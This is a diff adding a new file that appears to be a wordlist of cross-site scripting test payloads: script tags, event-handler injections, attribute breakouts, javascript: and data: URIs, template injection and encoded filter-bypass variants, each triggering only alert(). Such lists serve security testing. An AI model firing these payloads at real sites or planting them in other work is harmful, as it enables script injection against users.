@@ -1,0 +1,25 @@
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<body onload=alert(1)>
+"><img src=x onerror=alert(1)>
+" autofocus onfocus=alert(1) x="
+' onfocus=alert(1) autofocus='
+';alert(1);//
+</script><script>alert(1)</script>
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+<iframe src="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<scr<script>ipt>alert(1)</script>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+<img src=x onerror=alert`1`>
+<svg><script>alert(1)</script></svg>
